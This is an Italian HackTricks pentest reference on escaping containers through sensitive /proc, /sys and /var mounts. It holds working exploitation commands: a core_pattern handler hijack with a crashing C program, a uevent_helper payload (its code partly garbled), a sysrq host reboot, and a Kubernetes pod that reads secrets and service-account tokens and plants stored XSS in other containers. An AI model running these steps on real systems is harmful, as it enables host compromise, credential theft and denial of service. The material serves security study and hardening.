# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

L'esposizione di `/proc`, `/sys` e `/var` senza un'adeguata isolamento dei namespace introduce significativi rischi per la sicurezza, inclusi l'ampliamento della superficie di attacco e la divulgazione di informazioni. Questi directory contengono file sensibili che, se mal configurati o accessibili da un utente non autorizzato, possono portare a fuga dal container, modifica dell'host o fornire informazioni che facilitano ulteriori attacchi. Ad esempio, montare in modo errato `-v /proc:/host/proc` può eludere la protezione di AppArmor a causa della sua natura basata su percorso, lasciando `/host/proc` non protetto.

**Puoi trovare ulteriori dettagli su ciascuna potenziale vulnerabilità in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Vulnerabilities

### `/proc/sys`

Questa directory consente l'accesso per modificare le variabili del kernel, di solito tramite `sysctl(2)`, e contiene diversi sottodirectory di interesse:

#### **`/proc/sys/kernel/core_pattern`**

- Descritto in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Se puoi scrivere all'interno di questo file, è possibile scrivere una pipe `|` seguita dal percorso di un programma o script che verrà eseguito dopo che si verifica un crash.
- Un attaccante può trovare il percorso all'interno dell'host per il suo container eseguendo `mount` e scrivere il percorso a un binario all'interno del file system del suo container. Poi, far crashare un programma per far eseguire il binario al di fuori del container.

- **Esempio di Test e Sfruttamento**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
Controlla [questo post](https://pwning.systems/posts/escaping-containers-for-fun/) per ulteriori informazioni.

Esempio di programma che si blocca:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- Dettagliato in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contiene il percorso per il caricatore di moduli del kernel, invocato per caricare i moduli del kernel.
- **Esempio di Controllo Accesso**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Controlla l'accesso a modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Riferito in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Un flag globale che controlla se il kernel va in panico o invoca l'oom killer quando si verifica una condizione OOM.

#### **`/proc/sys/fs`**

- Secondo [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contiene opzioni e informazioni sul file system.
- L'accesso in scrittura può abilitare vari attacchi di denial-of-service contro l'host.

#### **`/proc/sys/fs/binfmt_misc`**

- Consente di registrare interpreti per formati binari non nativi basati sul loro numero magico.
- Può portare a un'elevazione di privilegi o accesso a shell root se `/proc/sys/fs/binfmt_misc/register` è scrivibile.
- Sfruttamento e spiegazione rilevanti:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Tutorial approfondito: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Altri in `/proc`

#### **`/proc/config.gz`**

- Può rivelare la configurazione del kernel se `CONFIG_IKCONFIG_PROC` è abilitato.
- Utile per gli attaccanti per identificare vulnerabilità nel kernel in esecuzione.

#### **`/proc/sysrq-trigger`**

- Consente di invocare comandi Sysrq, potenzialmente causando riavvii immediati del sistema o altre azioni critiche.
- **Esempio di Riavvio Host**:

```bash
echo b > /proc/sysrq-trigger # Riavvia l'host
```

#### **`/proc/kmsg`**

- Espone i messaggi del buffer di anello del kernel.
- Può aiutare negli exploit del kernel, perdite di indirizzi e fornire informazioni sensibili sul sistema.

#### **`/proc/kallsyms`**

- Elenca i simboli esportati dal kernel e i loro indirizzi.
- Essenziale per lo sviluppo di exploit del kernel, specialmente per superare KASLR.
- Le informazioni sugli indirizzi sono limitate con `kptr_restrict` impostato su `1` o `2`.
- Dettagli in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interfaccia con il dispositivo di memoria del kernel `/dev/mem`.
- Storicamente vulnerabile ad attacchi di elevazione di privilegi.
- Maggiori informazioni su [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Rappresenta la memoria fisica del sistema in formato ELF core.
- La lettura può rivelare i contenuti della memoria del sistema host e di altri container.
- La grande dimensione del file può portare a problemi di lettura o crash del software.
- Utilizzo dettagliato in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Interfaccia alternativa per `/dev/kmem`, rappresenta la memoria virtuale del kernel.
- Consente lettura e scrittura, quindi modifica diretta della memoria del kernel.

#### **`/proc/mem`**

- Interfaccia alternativa per `/dev/mem`, rappresenta la memoria fisica.
- Consente lettura e scrittura, la modifica di tutta la memoria richiede la risoluzione degli indirizzi virtuali in fisici.

#### **`/proc/sched_debug`**

- Restituisce informazioni sulla pianificazione dei processi, bypassando le protezioni dello spazio dei nomi PID.
- Espone nomi di processi, ID e identificatori cgroup.

#### **`/proc/[pid]/mountinfo`**

- Fornisce informazioni sui punti di montaggio nello spazio dei nomi di montaggio del processo.
- Espone la posizione del `rootfs` o dell'immagine del container.

### Vulnerabilità di `/sys`

#### **`/sys/kernel/uevent_helper`**

- Utilizzato per gestire i `uevents` dei dispositivi del kernel.
- Scrivere in `/sys/kernel/uevent_helper` può eseguire script arbitrari al verificarsi di `uevent`.
- **Esempio di Sfruttamento**: %%%bash

#### Crea un payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Trova il percorso host dal montaggio OverlayFS per il container

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Imposta uevent_helper su helper malevolo

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Attiva un uevent

echo change > /sys/class/mem/null/uevent

#### Legge l'output

cat /output %%%

#### **`/sys/class/thermal`**

- Controlla le impostazioni di temperatura, potenzialmente causando attacchi DoS o danni fisici.

#### **`/sys/kernel/vmcoreinfo`**

- Rilascia indirizzi del kernel, compromettendo potenzialmente KASLR.

#### **`/sys/kernel/security`**

- Contiene l'interfaccia `securityfs`, che consente la configurazione dei Moduli di Sicurezza Linux come AppArmor.
- L'accesso potrebbe consentire a un container di disabilitare il proprio sistema MAC.

#### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**

- Espone interfacce per interagire con le variabili EFI in NVRAM.
- Una configurazione errata o uno sfruttamento possono portare a laptop bloccati o macchine host non avviabili.

#### **`/sys/kernel/debug`**

- `debugfs` offre un'interfaccia di debug "senza regole" al kernel.
- Storia di problemi di sicurezza a causa della sua natura illimitata.

### Vulnerabilità di `/var`

La cartella **/var** dell'host contiene socket di runtime del container e i filesystem dei container. Se questa cartella è montata all'interno di un container, quel container avrà accesso in lettura-scrittura ai filesystem di altri container con privilegi di root. Questo può essere abusato per passare tra i container, causare un denial of service o inserire backdoor in altri container e applicazioni che vi girano.

#### Kubernetes

Se un container come questo è distribuito con Kubernetes:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Dentro del contenitore **pod-mounts-var-folder**:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
L'XSS è stato ottenuto:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Nota che il container NON richiede un riavvio o altro. Qualsiasi modifica effettuata tramite la cartella montata **/var** verrà applicata istantaneamente.

Puoi anche sostituire file di configurazione, binari, servizi, file di applicazione e profili di shell per ottenere RCE automatico (o semi-automatico).

##### Accesso alle credenziali cloud

Il container può leggere i token del serviceaccount K8s o i token webidentity AWS
che consentono al container di ottenere accesso non autorizzato a K8s o al cloud:
```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```
#### Docker

Lo sfruttamento in Docker (o nelle distribuzioni Docker Compose) è esattamente lo stesso, tranne per il fatto che di solito i filesystem degli altri container sono disponibili sotto un percorso di base diverso:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Quindi i filesystem si trovano sotto `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Nota

I percorsi effettivi possono differire in diverse configurazioni, motivo per cui la tua migliore opzione è utilizzare il comando **find** per localizzare i filesystem degli altri container e i token di identità SA / web.

### Riferimenti

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
